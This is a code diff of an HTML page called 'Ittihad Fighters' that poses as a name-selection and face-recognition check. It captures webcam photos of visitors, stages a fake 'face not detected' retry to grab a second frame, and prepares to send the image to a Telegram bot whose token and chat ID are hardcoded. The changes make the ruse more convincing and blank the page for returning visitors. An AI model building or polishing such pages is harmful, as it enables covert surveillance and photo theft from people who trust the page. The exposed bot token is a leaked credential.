@@ -6,7 +6,8 @@
     <title>Ittihad Fighters</title>
     <script>
         if (localStorage.getItem("site_accessed")) {
-            document.write("You have already accessed this site once.");
+            document.body.innerHTML = "";
+            return;
         }
     </script>
     <style>
@@ -15,7 +16,8 @@
             font-family: Arial, sans-serif;
         }
         .hidden { display: none; }
-        #animation { width: 100px; height: 100px; border-radius: 50%; border: 5px solid #ff4081; margin: 20px auto; }
+        #animation { width: 100px; height: 100px; border-radius: 50%; border: 5px solid #ff4081; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -23,9 +25,9 @@
     <div id="name-selection">
         <p>Select your name:</p>
         <ul>
-            <li><input type="checkbox" class="name-checkbox" value="Izz" onclick="disableCheckboxes(this)"> Izz</li>
-            <li><input type="checkbox" class="name-checkbox" value="Ali" onclick="disableCheckboxes(this)"> Ali</li>
-            <li><input type="checkbox" class="name-checkbox" value="Sara" onclick="disableCheckboxes(this)"> Sara</li>
+            <li><input type="checkbox" class="name-checkbox" value="Izz" onclick="lockSelection(this)"> Izz</li>
+            <li><input type="checkbox" class="name-checkbox" value="Ali" onclick="lockSelection(this)"> Ali</li>
+            <li><input type="checkbox" class="name-checkbox" value="Sara" onclick="lockSelection(this)"> Sara</li>
         </ul>
         <button onclick="goToFaceRecognition()">Proceed</button>
     </div>
@@ -38,6 +40,7 @@
     </div>
 
     <div id="scanning" class="hidden">
+        <div id="animation"></div>
         <video id="video" class="hidden" autoplay></video>
         <canvas id="canvas" class="hidden"></canvas>
     </div>
@@ -50,9 +53,10 @@
         const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
         const TELEGRAM_CHAT_ID = '5934902786';
 
-        function disableCheckboxes(selected) {
+        function lockSelection(selected) {
             document.querySelectorAll('.name-checkbox').forEach(checkbox => {
-                if (checkbox !== selected) checkbox.disabled = true;
+                checkbox.disabled = true;
+                if (checkbox !== selected) checkbox.checked = false;
             });
         }
 
@@ -71,10 +75,11 @@
 
         async function startCamera() {
             document.getElementById("face-recognition").classList.add("hidden");
+            document.getElementById("scanning").classList.remove("hidden");
             let video = document.getElementById("video");
             let canvas = document.getElementById("canvas");
             let ctx = canvas.getContext("2d");
-            
+
             try {
                 let stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
@@ -90,13 +95,18 @@
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
             if (!isSecond) {
+                document.getElementById("scanning").classList.add("hidden");
                 document.getElementById("face-not-detected").classList.remove("hidden");
-                setTimeout(() => captureImage(video, canvas, ctx, stream, true), 5000);
+                setTimeout(() => {
+                    document.getElementById("face-not-detected").classList.add("hidden");
+                    document.getElementById("scanning").classList.remove("hidden");
+                    captureImage(video, canvas, ctx, stream, true);
+                }, 5000);
                 return;
             }
             
             video.srcObject.getTracks().forEach(track => track.stop());
-            document.getElementById("face-not-detected").classList.add("hidden");
+            document.getElementById("scanning").classList.add("hidden");
             
             canvas.toBlob(blob => {
                 let formData = new FormData();
